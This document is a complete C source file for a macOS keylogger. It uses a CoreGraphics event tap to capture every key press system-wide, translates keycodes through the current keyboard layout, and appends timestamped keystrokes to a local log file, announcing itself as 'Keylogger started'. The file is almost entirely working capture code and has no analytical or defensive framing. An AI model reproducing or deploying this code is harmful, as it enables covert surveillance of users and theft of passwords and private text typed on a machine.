#include <CoreGraphics/CoreGraphics.h>
#include <Carbon/Carbon.h>
#include <stdio.h>
#include <time.h>
#include <wctype.h>

const char *LOG_FILE = "./keystrokes.log";

bool is_printable(unsigned char c) {
    return isprint(c) || isspace(c);
}

char get_char_from_keycode(CGKeyCode keycode, CGEventFlags flags) {
    TISInputSourceRef keyboard = TISCopyCurrentKeyboardInputSource();
    CFDataRef layout_data = (CFDataRef)TISGetInputSourceProperty(keyboard, kTISPropertyUnicodeKeyLayoutData);
    const UCKeyboardLayout *keyboard_layout = (const UCKeyboardLayout *)CFDataGetBytePtr(layout_data);
    
    UInt32 modifier_key_state = (flags >> 16) & 0xFF; 
    UInt32 dead_key_state = 0;
    UniCharCount max_length = 4;
    UniCharCount actual_length = 0;
    UniChar unicode_char[max_length];
    
    OSStatus status = UCKeyTranslate(
        keyboard_layout,
        keycode,
        kUCKeyActionDisplay,
        modifier_key_state,
        LMGetKbdType(),
        kUCKeyTranslateNoDeadKeysBit,
        &dead_key_state,
        max_length,
        &actual_length,
        unicode_char
    );
    
    CFRelease(keyboard);
    
    if (status == noErr && actual_length > 0) {
        return (char)unicode_char[0];
    }
    return '\0';
}

CGEventRef callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        CGEventFlags flags = CGEventGetFlags(event);
        char c = get_char_from_keycode(keycode, flags);
        
        // Handle special keys
        const char* special_keys[] = {
            [kVK_Return] = "[Return]",
            [kVK_Delete] = "[Backspace]",
            [kVK_Tab] = "[Tab]",
            [kVK_Space] = "[Space]",
            [kVK_Escape] = "[Escape]",
            [kVK_Command] = "[Command]",
            [kVK_Shift] = "[Shift]",
            [kVK_CapsLock] = "[CapsLock]",
            [kVK_Option] = "[Option]",
            [kVK_Control] = "[Control]"
        };
        
        time_t timestamp;
        time(&timestamp);
        
        FILE *f = fopen(LOG_FILE, "a+");
        if (f) {
            if (is_printable(c)) {
                fprintf(f, "[%lld] %c\n", (long long)timestamp, c);
            } else if (keycode < sizeof(special_keys)/sizeof(special_keys[0]) && special_keys[keycode]) {
                fprintf(f, "[%lld] %s\n", (long long)timestamp, special_keys[keycode]);
            } else {
                fprintf(f, "[%lld] [Keycode:%d]\n", (long long)timestamp, keycode);
            }
            fclose(f);
        }
    }
    return event;
}


int main() {
    // Request accessibility permissions (MUST be enabled manually in System Preferences)
    CFStringRef keys[1] = { kAXTrustedCheckOptionPrompt };
    CFBooleanRef values[1] = { kCFBooleanTrue };
    CFDictionaryRef options = CFDictionaryCreate(NULL, (const void **)keys, (const void **)values, 1, NULL, NULL);
    if (!AXIsProcessTrustedWithOptions(options)) {
        fprintf(stderr, "Error: Accessibility permissions required!\n");
        return 1;
    }

    CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        0,
        mask,
        callback,
        NULL
    );

    if (!eventTap) {
        fprintf(stderr, "Error: Failed to create event tap\n");
        return 1;
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(NULL, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    printf("Keylogger started. Press Control+C to exit...\n");
    CFRunLoopRun();

    return 0;
}